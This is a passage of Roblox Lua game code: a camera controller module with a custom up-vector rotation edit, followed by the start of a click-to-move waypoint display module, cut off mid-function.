		function CameraModule.new()
			local self = setmetatable({},CameraModule)

			-- Current active controller instances
			self.activeCameraController = nil
			self.activeOcclusionModule = nil
			self.activeTransparencyController = nil
			self.activeMouseLockController = nil

			self.currentComputerCameraMovementMode = nil

			-- Connections to events
			self.cameraSubjectChangedConn = nil
			self.cameraTypeChangedConn = nil

			-- Adds CharacterAdded and CharacterRemoving event handlers for all current players
			for _,player in pairs(Players:GetPlayers()) do
				self:OnPlayerAdded(player)
			end

			-- Adds CharacterAdded and CharacterRemoving event handlers for all players who join in the future
			Players.PlayerAdded:Connect(function(player)
				self:OnPlayerAdded(player)
			end)

			self.activeTransparencyController = TransparencyController.new()
			self.activeTransparencyController:Enable(true)

			if not UserInputService.TouchEnabled then
				self.activeMouseLockController = MouseLockController.new()
				local toggleEvent = self.activeMouseLockController:GetBindableToggleEvent()
				if toggleEvent then
					toggleEvent:Connect(function()
						self:OnMouseLockToggled()
					end)
				end
			end

			self:ActivateCameraController(self:GetCameraControlChoice())
			self:ActivateOcclusionModule(Players.LocalPlayer.DevCameraOcclusionMode)
			self:OnCurrentCameraChanged() -- Does initializations and makes first camera controller
			RunService:BindToRenderStep("cameraRenderUpdate", Enum.RenderPriority.Camera.Value, function(dt) self:Update(dt) end)

			-- Connect listeners to camera-related properties
			for _, propertyName in pairs(PLAYER_CAMERA_PROPERTIES) do
				Players.LocalPlayer:GetPropertyChangedSignal(propertyName):Connect(function()
					self:OnLocalPlayerCameraPropertyChanged(propertyName)
				end)
			end

			for _, propertyName in pairs(USER_GAME_SETTINGS_PROPERTIES) do
				UserGameSettings:GetPropertyChangedSignal(propertyName):Connect(function()
					self:OnUserGameSettingsPropertyChanged(propertyName)
				end)
			end
			game.Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
				self:OnCurrentCameraChanged()
			end)

			self.lastInputType = UserInputService:GetLastInputType()
			UserInputService.LastInputTypeChanged:Connect(function(newLastInputType)
				self.lastInputType = newLastInputType
			end)

			return self
		end

		function CameraModule:GetCameraMovementModeFromSettings()
			local cameraMode = Players.LocalPlayer.CameraMode

			-- Lock First Person trumps all other settings and forces ClassicCamera
			if cameraMode == Enum.CameraMode.LockFirstPerson then
				return CameraUtils.ConvertCameraModeEnumToStandard(Enum.ComputerCameraMovementMode.Classic)
			end

			local devMode, userMode
			if UserInputService.TouchEnabled then
				devMode = CameraUtils.ConvertCameraModeEnumToStandard(Players.LocalPlayer.DevTouchCameraMode)
				userMode = CameraUtils.ConvertCameraModeEnumToStandard(UserGameSettings.TouchCameraMovementMode)
			else
				devMode = CameraUtils.ConvertCameraModeEnumToStandard(Players.LocalPlayer.DevComputerCameraMode)
				userMode = CameraUtils.ConvertCameraModeEnumToStandard(UserGameSettings.ComputerCameraMovementMode)
			end

			if devMode == Enum.DevComputerCameraMovementMode.UserChoice then
				-- Developer is allowing user choice, so user setting is respected
				return userMode
			end

			return devMode
		end

		function CameraModule:ActivateOcclusionModule( occlusionMode )
			local newModuleCreator
			if occlusionMode == Enum.DevCameraOcclusionMode.Zoom then
				newModuleCreator = Poppercam
			elseif occlusionMode == Enum.DevCameraOcclusionMode.Invisicam then
				newModuleCreator = Invisicam
			else
				warn("CameraScript ActivateOcclusionModule called with unsupported mode")
				return
			end

			-- First check to see if there is actually a change. If the module being requested is already
			-- the currently-active solution then just make sure it's enabled and exit early
			if self.activeOcclusionModule and self.activeOcclusionModule:GetOcclusionMode() == occlusionMode then
				if not self.activeOcclusionModule:GetEnabled() then
					self.activeOcclusionModule:Enable(true)
				end
				return
			end

			-- Save a reference to the current active module (may be nil) so that we can disable it if
			-- we are successful in activating its replacement
			local prevOcclusionModule = self.activeOcclusionModule

			-- If there is no active module, see if the one we need has already been instantiated
			self.activeOcclusionModule = instantiatedOcclusionModules[newModuleCreator]

			-- If the module was not already instantiated and selected above, instantiate it
			if not self.activeOcclusionModule then
				self.activeOcclusionModule = newModuleCreator.new()
				if self.activeOcclusionModule then
					instantiatedOcclusionModules[newModuleCreator] = self.activeOcclusionModule
				end
			end

			-- If we were successful in either selecting or instantiating the module,
			-- enable it if it's not already the currently-active enabled module
			if self.activeOcclusionModule then
				local newModuleOcclusionMode = self.activeOcclusionModule:GetOcclusionMode()
				-- Sanity check that the module we selected or instantiated actually supports the desired occlusionMode
				if newModuleOcclusionMode ~= occlusionMode then
					warn("CameraScript ActivateOcclusionModule mismatch: ",self.activeOcclusionModule:GetOcclusionMode(),"~=",occlusionMode)
				end

				-- Deactivate current module if there is one
				if prevOcclusionModule then
					-- Sanity check that current module is not being replaced by itself (that should have been handled above)
					if prevOcclusionModule ~= self.activeOcclusionModule then
						prevOcclusionModule:Enable(false)
					else
						warn("CameraScript ActivateOcclusionModule failure to detect already running correct module")
					end
				end

				-- Occlusion modules need to be initialized with information about characters and cameraSubject
				-- Invisicam needs the LocalPlayer's character
				-- Poppercam needs all player characters and the camera subject
				if occlusionMode == Enum.DevCameraOcclusionMode.Invisicam then
					-- Optimization to only send Invisicam what we know it needs
					if Players.LocalPlayer.Character then
						self.activeOcclusionModule:CharacterAdded(Players.LocalPlayer.Character, Players.LocalPlayer )
					end
				else
					-- When Poppercam is enabled, we send it all existing player characters for its raycast ignore list
					for _, player in pairs(Players:GetPlayers()) do
						if player and player.Character then
							self.activeOcclusionModule:CharacterAdded(player.Character, player)
						end
					end
					self.activeOcclusionModule:OnCameraSubjectChanged(game.Workspace.CurrentCamera.CameraSubject)
				end

				-- Activate new choice
				self.activeOcclusionModule:Enable(true)
			end
		end

		-- When supplied, legacyCameraType is used and cameraMovementMode is ignored (should be nil anyways)
		-- Next, if userCameraCreator is passed in, that is used as the cameraCreator
		function CameraModule:ActivateCameraController(cameraMovementMode, legacyCameraType)
			local newCameraCreator = nil

			if legacyCameraType~=nil then
			--[[
				This function has been passed a CameraType enum value. Some of these map to the use of
				the LegacyCamera module, the value "Custom" will be translated to a movementMode enum
				value based on Dev and User settings, and "Scriptable" will disable the camera controller.
			--]]

				if legacyCameraType == Enum.CameraType.Scriptable then
					if self.activeCameraController then
						self.activeCameraController:Enable(false)
						self.activeCameraController = nil
						return
					end
				elseif legacyCameraType == Enum.CameraType.Custom then
					cameraMovementMode = self:GetCameraMovementModeFromSettings()

				elseif legacyCameraType == Enum.CameraType.Track then
					-- Note: The TrackCamera module was basically an older, less fully-featured
					-- version of ClassicCamera, no longer actively maintained, but it is re-implemented in
					-- case a game was dependent on its lack of ClassicCamera's extra functionality.
					cameraMovementMode = Enum.ComputerCameraMovementMode.Classic

				elseif legacyCameraType == Enum.CameraType.Follow then
					cameraMovementMode = Enum.ComputerCameraMovementMode.Follow

				elseif legacyCameraType == Enum.CameraType.Orbital then
					cameraMovementMode = Enum.ComputerCameraMovementMode.Orbital

				elseif legacyCameraType == Enum.CameraType.Attach or
					legacyCameraType == Enum.CameraType.Watch or
					legacyCameraType == Enum.CameraType.Fixed then
					newCameraCreator = LegacyCamera
				else
					warn("CameraScript encountered an unhandled Camera.CameraType value: ",legacyCameraType)
				end
			end

			if not newCameraCreator then
				if cameraMovementMode == Enum.ComputerCameraMovementMode.Classic or
					cameraMovementMode == Enum.ComputerCameraMovementMode.Follow or
					cameraMovementMode == Enum.ComputerCameraMovementMode.Default or
					(FFlagUserCameraToggle and cameraMovementMode == Enum.ComputerCameraMovementMode.CameraToggle) then
					newCameraCreator = ClassicCamera
				elseif cameraMovementMode == Enum.ComputerCameraMovementMode.Orbital then
					newCameraCreator = OrbitalCamera
				else
					warn("ActivateCameraController did not select a module.")
					return
				end
			end

			-- Create the camera control module we need if it does not already exist in instantiatedCameraControllers
			local newCameraController
			if not instantiatedCameraControllers[newCameraCreator] then
				newCameraController = newCameraCreator.new()
				instantiatedCameraControllers[newCameraCreator] = newCameraController
			else
				newCameraController = instantiatedCameraControllers[newCameraCreator]
			end

			-- If there is a controller active and it's not the one we need, disable it,
			-- if it is the one we need, make sure it's enabled
			if self.activeCameraController then
				if self.activeCameraController ~= newCameraController then
					self.activeCameraController:Enable(false)
					self.activeCameraController = newCameraController
					self.activeCameraController:Enable(true)
				elseif not self.activeCameraController:GetEnabled() then
					self.activeCameraController:Enable(true)
				end
			elseif newCameraController ~= nil then
				self.activeCameraController = newCameraController
				self.activeCameraController:Enable(true)
			end

			if self.activeCameraController then
				if cameraMovementMode~=nil then
					self.activeCameraController:SetCameraMovementMode(cameraMovementMode)
				elseif legacyCameraType~=nil then
					-- Note that this is only called when legacyCameraType is not a type that
					-- was convertible to a ComputerCameraMovementMode value, i.e. really only applies to LegacyCamera
					self.activeCameraController:SetCameraType(legacyCameraType)
				end
			end
		end

		-- Note: The active transparency controller could be made to listen for this event itself.
		function CameraModule:OnCameraSubjectChanged()
			if self.activeTransparencyController then
				self.activeTransparencyController:SetSubject(game.Workspace.CurrentCamera.CameraSubject)
			end

			if self.activeOcclusionModule then
				self.activeOcclusionModule:OnCameraSubjectChanged(game.Workspace.CurrentCamera.CameraSubject)
			end
		end

		function CameraModule:OnCameraTypeChanged(newCameraType)
			if newCameraType == Enum.CameraType.Scriptable then
				if UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
					UserInputService.MouseBehavior = Enum.MouseBehavior.Default
				end
			end

			-- Forward the change to ActivateCameraController to handle
			self:ActivateCameraController(nil, newCameraType)
		end

		-- Note: Called whenever workspace.CurrentCamera changes, but also on initialization of this script
		function CameraModule:OnCurrentCameraChanged()
			local currentCamera = game.Workspace.CurrentCamera
			if not currentCamera then return end

			if self.cameraSubjectChangedConn then
				self.cameraSubjectChangedConn:Disconnect()
			end

			if self.cameraTypeChangedConn then
				self.cameraTypeChangedConn:Disconnect()
			end

			self.cameraSubjectChangedConn = currentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
				self:OnCameraSubjectChanged(currentCamera.CameraSubject)
			end)

			self.cameraTypeChangedConn = currentCamera:GetPropertyChangedSignal("CameraType"):Connect(function()
				self:OnCameraTypeChanged(currentCamera.CameraType)
			end)

			self:OnCameraSubjectChanged(currentCamera.CameraSubject)
			self:OnCameraTypeChanged(currentCamera.CameraType)
		end

		function CameraModule:OnLocalPlayerCameraPropertyChanged(propertyName)
			if propertyName == "CameraMode" then
				-- CameraMode is only used to turn on/off forcing the player into first person view. The
				-- Note: The case "Classic" is used for all other views and does not correspond only to the ClassicCamera module
				if Players.LocalPlayer.CameraMode == Enum.CameraMode.LockFirstPerson then
					-- Locked in first person, use ClassicCamera which supports this
					if not self.activeCameraController or self.activeCameraController:GetModuleName() ~= "ClassicCamera" then
						self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(Enum.DevComputerCameraMovementMode.Classic))
					end

					if self.activeCameraController then
						self.activeCameraController:UpdateForDistancePropertyChange()
					end
				elseif Players.LocalPlayer.CameraMode == Enum.CameraMode.Classic then
					-- Not locked in first person view
					local cameraMovementMode =self: GetCameraMovementModeFromSettings()
					self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(cameraMovementMode))
				else
					warn("Unhandled value for property player.CameraMode: ",Players.LocalPlayer.CameraMode)
				end

			elseif propertyName == "DevComputerCameraMode" or 
				propertyName == "DevTouchCameraMode" then
				local cameraMovementMode = self:GetCameraMovementModeFromSettings()
				self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(cameraMovementMode))

			elseif propertyName == "DevCameraOcclusionMode" then
				self:ActivateOcclusionModule(Players.LocalPlayer.DevCameraOcclusionMode)

			elseif propertyName == "CameraMinZoomDistance" or propertyName == "CameraMaxZoomDistance" then
				if self.activeCameraController then
					self.activeCameraController:UpdateForDistancePropertyChange()
				end
			elseif propertyName == "DevTouchMovementMode" then
			elseif propertyName == "DevComputerMovementMode" then
			elseif propertyName == "DevEnableMouseLock" then
				-- This is the enabling/disabling of "Shift Lock" mode, not LockFirstPerson (which is a CameraMode)
				-- Note: Enabling and disabling of MouseLock mode is normally only a publish-time choice made via
				-- the corresponding EnableMouseLockOption checkbox of StarterPlayer, and this script does not have
				-- support for changing the availability of MouseLock at runtime (this would require listening to
				-- Player.DevEnableMouseLock changes)
			end
		end

		function CameraModule:OnUserGameSettingsPropertyChanged(propertyName)
			if propertyName == 	"ComputerCameraMovementMode" then
				local cameraMovementMode = self:GetCameraMovementModeFromSettings()
				self:ActivateCameraController(CameraUtils.ConvertCameraModeEnumToStandard(cameraMovementMode))
			end
		end

	--[[
		Main RenderStep Update. The camera controller and occlusion module both have opportunities
		to set and modify (respectively) the CFrame and Focus before it is set once on CurrentCamera.
		The camera and occlusion modules should only return CFrames, not set the CFrame property of
		CurrentCamera directly.
	--]]
		function CameraModule:Update(dt)
			if self.activeCameraController then
				if FFlagUserCameraToggle then
					self.activeCameraController:UpdateMouseBehavior()
				end

				local newCameraCFrame, newCameraFocus = self.activeCameraController:Update(dt)
				self.activeCameraController:ApplyVRTransform()
				if self.activeOcclusionModule then
					newCameraCFrame, newCameraFocus = self.activeOcclusionModule:Update(dt, newCameraCFrame, newCameraFocus)
				end

				-- Here is where the new CFrame and Focus are set for this render frame
				game.Workspace.CurrentCamera.CFrame = newCameraCFrame
				game.Workspace.CurrentCamera.Focus = newCameraFocus

				-- Update to character local transparency as needed based on camera-to-subject distance
				if self.activeTransparencyController then
					self.activeTransparencyController:Update()
				end
			end
		end

		-- Formerly getCurrentCameraMode, this function resolves developer and user camera control settings to
		-- decide which camera control module should be instantiated. The old method of converting redundant enum types
		function CameraModule:GetCameraControlChoice()
			local player = Players.LocalPlayer

			if player then
				if self.lastInputType == Enum.UserInputType.Touch or UserInputService.TouchEnabled then
					-- Touch
					if player.DevTouchCameraMode == Enum.DevTouchCameraMovementMode.UserChoice then
						return CameraUtils.ConvertCameraModeEnumToStandard( UserGameSettings.TouchCameraMovementMode )
					else
						return CameraUtils.ConvertCameraModeEnumToStandard( player.DevTouchCameraMode )
					end
				else
					-- Computer
					if player.DevComputerCameraMode == Enum.DevComputerCameraMovementMode.UserChoice then
						local computerMovementMode = CameraUtils.ConvertCameraModeEnumToStandard(UserGameSettings.ComputerCameraMovementMode)
						return CameraUtils.ConvertCameraModeEnumToStandard(computerMovementMode)
					else
						return CameraUtils.ConvertCameraModeEnumToStandard(player.DevComputerCameraMode)
					end
				end
			end
		end

		function CameraModule:OnCharacterAdded(char, player)
			if self.activeOcclusionModule then
				self.activeOcclusionModule:CharacterAdded(char, player)
			end
		end

		function CameraModule:OnCharacterRemoving(char, player)
			if self.activeOcclusionModule then
				self.activeOcclusionModule:CharacterRemoving(char, player)
			end
		end

		function CameraModule:OnPlayerAdded(player)
			player.CharacterAdded:Connect(function(char)
				self:OnCharacterAdded(char, player)
			end)
			player.CharacterRemoving:Connect(function(char)
				self:OnCharacterRemoving(char, player)
			end)
		end

		function CameraModule:OnMouseLockToggled()
			if self.activeMouseLockController then
				local mouseLocked = self.activeMouseLockController:GetIsMouseLocked()
				local mouseLockOffset = self.activeMouseLockController:GetMouseLockOffset()
				if self.activeCameraController then
					self.activeCameraController:SetIsMouseLocked(mouseLocked)
					self.activeCameraController:SetMouseLockOffset(mouseLockOffset)
				end
			end
		end
		--begin edit
		local Camera = CameraModule
		local IDENTITYCF = CFrame.new()
		local lastUpCFrame = IDENTITYCF

		Camera.UpVector = Vector3.new(0, 1, 0)
		Camera.TransitionRate = 0.15
		Camera.UpCFrame = IDENTITYCF

		function Camera:GetUpVector(oldUpVector)
			return oldUpVector
		end
		local function getRotationBetween(u, v, axis)
			local dot, uxv = u:Dot(v), u:Cross(v)
			if (dot < -0.99999) then return CFrame.fromAxisAngle(axis, math.pi) end
			return CFrame.new(0, 0, 0, uxv.x, uxv.y, uxv.z, 1 + dot)
		end
		function Camera:CalculateUpCFrame()
			local oldUpVector = self.UpVector
			local newUpVector = self:GetUpVector(oldUpVector)

			local backup = game.Workspace.CurrentCamera.CFrame.RightVector
			local transitionCF = getRotationBetween(oldUpVector, newUpVector, backup)
			local vecSlerpCF = IDENTITYCF:Lerp(transitionCF, self.TransitionRate)

			self.UpVector = vecSlerpCF * oldUpVector
			self.UpCFrame = vecSlerpCF * self.UpCFrame

			lastUpCFrame = self.UpCFrame
		end

		function Camera:Update(dt)
			if self.activeCameraController then
				if Camera.FFlagUserCameraToggle then
					self.activeCameraController:UpdateMouseBehavior()
				end

				local newCameraCFrame, newCameraFocus = self.activeCameraController:Update(dt)
				self.activeCameraController:ApplyVRTransform()

				self:CalculateUpCFrame()
				self.activeCameraController:UpdateUpCFrame(self.UpCFrame)

				-- undo shift-lock offset

				local lockOffset = Vector3.new(0, 0, 0)
				if (self.activeMouseLockController and self.activeMouseLockController:GetIsMouseLocked()) then
					lockOffset = self.activeMouseLockController:GetMouseLockOffset()
				end

				local offset = newCameraFocus:ToObjectSpace(newCameraCFrame)
				local camRotation = self.UpCFrame * offset
				newCameraFocus = newCameraFocus - newCameraCFrame:VectorToWorldSpace(lockOffset) + camRotation:VectorToWorldSpace(lockOffset)
				newCameraCFrame = newCameraFocus * camRotation

				--local offset = newCameraFocus:Inverse() * newCameraCFrame
				--newCameraCFrame = newCameraFocus * self.UpCFrame * offset

				if (self.activeCameraController.lastCameraTransform) then
					self.activeCameraController.lastCameraTransform = newCameraCFrame
					self.activeCameraController.lastCameraFocus = newCameraFocus
				end

				if self.activeOcclusionModule then
					newCameraCFrame, newCameraFocus = self.activeOcclusionModule:Update(dt, newCameraCFrame, newCameraFocus)
				end

				game.Workspace.CurrentCamera.CFrame = newCameraCFrame
				game.Workspace.CurrentCamera.Focus = newCameraFocus

				if self.activeTransparencyController then
					self.activeTransparencyController:Update()
				end
			end
		end

		function Camera:IsFirstPerson()
			if self.activeCameraController then
				return self.activeCameraController:InFirstPerson()
			end
			return false
		end

		function Camera:IsMouseLocked()
			if self.activeCameraController then
				return self.activeCameraController:GetIsMouseLocked()
			end
			return false
		end
		function Camera:IsToggleMode()
			if self.activeCameraController then
				return self.activeCameraController.isCameraToggle
			end
			return false
		end
		function Camera:IsCamRelative()
			return self:IsMouseLocked() or self:IsFirstPerson()
			--return self:IsToggleMode(), self:IsMouseLocked(), self:IsFirstPerson()
		end
		--
		local Utils = _CameraUtils()
		function Utils.GetAngleBetweenXZVectors(v1, v2)
			local upCFrame = lastUpCFrame
			v1 = upCFrame:VectorToObjectSpace(v1)
			v2 = upCFrame:VectorToObjectSpace(v2)
			return math.atan2(v2.X*v1.Z-v2.Z*v1.X, v2.X*v1.X+v2.Z*v1.Z)
		end
		--end edit
		local cameraModuleObject = CameraModule.new()
		local cameraApi = {}
		return cameraModuleObject
	end

	function _ClickToMoveDisplay()
		local ClickToMoveDisplay = {}

		local FAILURE_ANIMATION_ID = "rbxassetid://2874840706"

		local TrailDotIcon = "rbxasset://textures/ui/traildot.png"
		local EndWaypointIcon = "rbxasset://textures/ui/waypoint.png"

		local WaypointsAlwaysOnTop = false

		local WAYPOINT_INCLUDE_FACTOR = 2
		local LAST_DOT_DISTANCE = 3

		local WAYPOINT_BILLBOARD_SIZE = UDim2.new(0, 1.68 * 25, 0, 2 * 25)

		local ENDWAYPOINT_SIZE_OFFSET_MIN = Vector2.new(0, 0.5)
		local ENDWAYPOINT_SIZE_OFFSET_MAX = Vector2.new(0, 1)

		local FAIL_WAYPOINT_SIZE_OFFSET_CENTER = Vector2.new(0, 0.5)
		local FAIL_WAYPOINT_SIZE_OFFSET_LEFT = Vector2.new(0.1, 0.5)
		local FAIL_WAYPOINT_SIZE_OFFSET_RIGHT = Vector2.new(-0.1, 0.5)

		local FAILURE_TWEEN_LENGTH = 0.125
		local FAILURE_TWEEN_COUNT = 4

		local TWEEN_WAYPOINT_THRESHOLD = 5

		local TRAIL_DOT_PARENT_NAME = "ClickToMoveDisplay"

		local TrailDotSize = Vector2.new(1.5, 1.5)

		local TRAIL_DOT_MIN_SCALE = 1
		local TRAIL_DOT_MIN_DISTANCE = 10
		local TRAIL_DOT_MAX_SCALE = 2.5
		local TRAIL_DOT_MAX_DISTANCE = 100

		local PlayersService = game:GetService("Players")
		local TweenService = game:GetService("TweenService")
		local RunService = game:GetService("RunService")
		local Workspace = game:GetService("Workspace")

		local LocalPlayer = PlayersService.LocalPlayer

		local function CreateWaypointTemplates()
			local TrailDotTemplate = Instance.new("Part")
			TrailDotTemplate.Size = Vector3.new(1, 1, 1)
			TrailDotTemplate.Anchored = true
			TrailDotTemplate.CanCollide = false
			TrailDotTemplate.Name = "TrailDot"
			TrailDotTemplate.Transparency = 1
			local TrailDotImage = Instance.new("ImageHandleAdornment")
			TrailDotImage.Name = "TrailDotImage"
			TrailDotImage.Size = TrailDotSize
			TrailDotImage.SizeRelativeOffset = Vector3.new(0, 0, -0.1)
			TrailDotImage.AlwaysOnTop = WaypointsAlwaysOnTop
			TrailDotImage.Image = TrailDotIcon
			TrailDotImage.Adornee = TrailDotTemplate
			TrailDotImage.Parent = TrailDotTemplate

			local EndWaypointTemplate = Instance.new("Part")
			EndWaypointTemplate.Size = Vector3.new(2, 2, 2)
			EndWaypointTemplate.Anchored = true
			EndWaypointTemplate.CanCollide = false
			EndWaypointTemplate.Name = "EndWaypoint"
			EndWaypointTemplate.Transparency = 1
			local EndWaypointImage = Instance.new("ImageHandleAdornment")
			EndWaypointImage.Name = "TrailDotImage"
			EndWaypointImage.Size = TrailDotSize
			EndWaypointImage.SizeRelativeOffset = Vector3.new(0, 0, -0.1)
			EndWaypointImage.AlwaysOnTop = WaypointsAlwaysOnTop
			EndWaypointImage.Image = TrailDotIcon
			EndWaypointImage.Adornee = EndWaypointTemplate
			EndWaypointImage.Parent = EndWaypointTemplate
			local EndWaypointBillboard = Instance.new("BillboardGui")
			EndWaypointBillboard.Name = "EndWaypointBillboard"
			EndWaypointBillboard.Size = WAYPOINT_BILLBOARD_SIZE
			EndWaypointBillboard.LightInfluence = 0
			EndWaypointBillboard.SizeOffset = ENDWAYPOINT_SIZE_OFFSET_MIN
			EndWaypointBillboard.AlwaysOnTop = true
			EndWaypointBillboard.Adornee = EndWaypointTemplate
			EndWaypointBillboard.Parent = EndWaypointTemplate
			local EndWaypointImageLabel = Instance.new("ImageLabel")
			EndWaypointImageLabel.Image = EndWaypointIcon
			EndWaypointImageLabel.BackgroundTransparency = 1
			EndWaypointImageLabel.Size = UDim2.new(1, 0, 1, 0)
			EndWaypointImageLabel.Parent = EndWaypointBillboard


			local FailureWaypointTemplate = Instance.new("Part")
			FailureWaypointTemplate.Size = Vector3.new(2, 2, 2)
			FailureWaypointTemplate.Anchored = true
			FailureWaypointTemplate.CanCollide = false
			FailureWaypointTemplate.Name = "FailureWaypoint"
			FailureWaypointTemplate.Transparency = 1
			local FailureWaypointImage = Instance.new("ImageHandleAdornment")
			FailureWaypointImage.Name = "TrailDotImage"
			FailureWaypointImage.Size = TrailDotSize
			FailureWaypointImage.SizeRelativeOffset = Vector3.new(0, 0, -0.1)
			FailureWaypointImage.AlwaysOnTop = WaypointsAlwaysOnTop
			FailureWaypointImage.Image = TrailDotIcon
			FailureWaypointImage.Adornee = FailureWaypointTemplate
			FailureWaypointImage.Parent = FailureWaypointTemplate
			local FailureWaypointBillboard = Instance.new("BillboardGui")
			FailureWaypointBillboard.Name = "FailureWaypointBillboard"
			FailureWaypointBillboard.Size = WAYPOINT_BILLBOARD_SIZE
			FailureWaypointBillboard.LightInfluence = 0
			FailureWaypointBillboard.SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_CENTER
			FailureWaypointBillboard.AlwaysOnTop = true
			FailureWaypointBillboard.Adornee = FailureWaypointTemplate
			FailureWaypointBillboard.Parent = FailureWaypointTemplate
			local FailureWaypointFrame = Instance.new("Frame")
			FailureWaypointFrame.BackgroundTransparency = 1
			FailureWaypointFrame.Size = UDim2.new(0, 0, 0, 0)
			FailureWaypointFrame.Position = UDim2.new(0.5, 0, 1, 0)
			FailureWaypointFrame.Parent = FailureWaypointBillboard
			local FailureWaypointImageLabel = Instance.new("ImageLabel")
			FailureWaypointImageLabel.Image = EndWaypointIcon
			FailureWaypointImageLabel.BackgroundTransparency = 1
			FailureWaypointImageLabel.Position = UDim2.new(
				0, -WAYPOINT_BILLBOARD_SIZE.X.Offset/2, 0, -WAYPOINT_BILLBOARD_SIZE.Y.Offset
			)
			FailureWaypointImageLabel.Size = WAYPOINT_BILLBOARD_SIZE
			FailureWaypointImageLabel.Parent = FailureWaypointFrame

			return TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate
		end

		local TrailDotTemplate, EndWaypointTemplate, FailureWaypointTemplate = CreateWaypointTemplates()

		local function getTrailDotParent()
			local camera = Workspace.CurrentCamera
			local trailParent = camera:FindFirstChild(TRAIL_DOT_PARENT_NAME)
			if not trailParent then
				trailParent = Instance.new("Model")
				trailParent.Name = TRAIL_DOT_PARENT_NAME
				trailParent.Parent = camera
			end
			return trailParent
		end

		local function placePathWaypoint(waypointModel, position)
			local ray = Ray.new(position + Vector3.new(0, 2.5, 0), Vector3.new(0, -10, 0))
			local hitPart, hitPoint, hitNormal = Workspace:FindPartOnRayWithIgnoreList(
				ray,
				{ Workspace.CurrentCamera, LocalPlayer.Character }
			)
			if hitPart then
				waypointModel.CFrame = CFrame.new(hitPoint, hitPoint + hitNormal)
				waypointModel.Parent = getTrailDotParent()
			end
		end

		local TrailDot = {}
		TrailDot.__index = TrailDot

		function TrailDot:Destroy()
			self.DisplayModel:Destroy()
		end

		function TrailDot:NewDisplayModel(position)
			local newDisplayModel = TrailDotTemplate:Clone()
			placePathWaypoint(newDisplayModel, position)
			return newDisplayModel
		end

		function TrailDot.new(position, closestWaypoint)
			local self = setmetatable({}, TrailDot)

			self.DisplayModel = self:NewDisplayModel(position)
			self.ClosestWayPoint = closestWaypoint

			return self
		end

		local EndWaypoint = {}
		EndWaypoint.__index = EndWaypoint

		function EndWaypoint:Destroy()
			self.Destroyed = true
			self.Tween:Cancel()
			self.DisplayModel:Destroy()
		end

		function EndWaypoint:NewDisplayModel(position)
			local newDisplayModel = EndWaypointTemplate:Clone()
			placePathWaypoint(newDisplayModel, position)
			return newDisplayModel
		end

		function EndWaypoint:CreateTween()
			local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, -1, true)
			local tween = TweenService:Create(
				self.DisplayModel.EndWaypointBillboard,
				tweenInfo,
				{ SizeOffset = ENDWAYPOINT_SIZE_OFFSET_MAX }
			)
			tween:Play()
			return tween
		end

		function EndWaypoint:TweenInFrom(originalPosition)
			local currentPositon = self.DisplayModel.Position
			local studsOffset = originalPosition - currentPositon
			self.DisplayModel.EndWaypointBillboard.StudsOffset = Vector3.new(0, studsOffset.Y, 0)
			local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
			local tween = TweenService:Create(
				self.DisplayModel.EndWaypointBillboard,
				tweenInfo,
				{ StudsOffset = Vector3.new(0, 0, 0) }
			)
			tween:Play()
			return tween
		end

		function EndWaypoint.new(position, closestWaypoint, originalPosition)
			local self = setmetatable({}, EndWaypoint)

			self.DisplayModel = self:NewDisplayModel(position)
			self.Destroyed = false
			if originalPosition and (originalPosition - position).magnitude > TWEEN_WAYPOINT_THRESHOLD then
				self.Tween = self:TweenInFrom(originalPosition)
				coroutine.wrap(function()
					self.Tween.Completed:Wait()
					if not self.Destroyed then
						self.Tween = self:CreateTween()
					end
				end)()
			else
				self.Tween = self:CreateTween()
			end
			self.ClosestWayPoint = closestWaypoint

			return self
		end

		local FailureWaypoint = {}
		FailureWaypoint.__index = FailureWaypoint

		function FailureWaypoint:Hide()
			self.DisplayModel.Parent = nil
		end

		function FailureWaypoint:Destroy()
			self.DisplayModel:Destroy()
		end

		function FailureWaypoint:NewDisplayModel(position)
			local newDisplayModel = FailureWaypointTemplate:Clone()
			placePathWaypoint(newDisplayModel, position)
			local ray = Ray.new(position + Vector3.new(0, 2.5, 0), Vector3.new(0, -10, 0))
			local hitPart, hitPoint, hitNormal = Workspace:FindPartOnRayWithIgnoreList(
				ray, { Workspace.CurrentCamera, LocalPlayer.Character }
			)
			if hitPart then
				newDisplayModel.CFrame = CFrame.new(hitPoint, hitPoint + hitNormal)
				newDisplayModel.Parent = getTrailDotParent()
			end
			return newDisplayModel
		end

		function FailureWaypoint:RunFailureTween()
			wait(FAILURE_TWEEN_LENGTH) -- Delay one tween length betfore starting tweening
			-- Tween out from center
			local tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH/2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
			local tweenLeft = TweenService:Create(self.DisplayModel.FailureWaypointBillboard, tweenInfo,
				{ SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_LEFT })
			tweenLeft:Play()

			local tweenLeftRoation = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame, tweenInfo,
				{ Rotation = 10 })
			tweenLeftRoation:Play()

			tweenLeft.Completed:wait()

			-- Tween back and forth
			tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH, Enum.EasingStyle.Sine, Enum.EasingDirection.Out,
				FAILURE_TWEEN_COUNT - 1, true)
			local tweenSideToSide = TweenService:Create(self.DisplayModel.FailureWaypointBillboard, tweenInfo,
				{ SizeOffset = FAIL_WAYPOINT_SIZE_OFFSET_RIGHT})
			tweenSideToSide:Play()

			-- Tween flash dark and roate left and right
			tweenInfo = TweenInfo.new(FAILURE_TWEEN_LENGTH, Enum.EasingStyle.Sine, Enum.EasingDirection.Out,
				FAILURE_TWEEN_COUNT - 1, true)
			local tweenFlash = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame.ImageLabel, tweenInfo,
				{ ImageColor3 = Color3.new(0.75, 0.75, 0.75)})
			tweenFlash:Play()

			local tweenRotate = TweenService:Create(self.DisplayModel.FailureWaypointBillboard.Frame, tweenInfo,
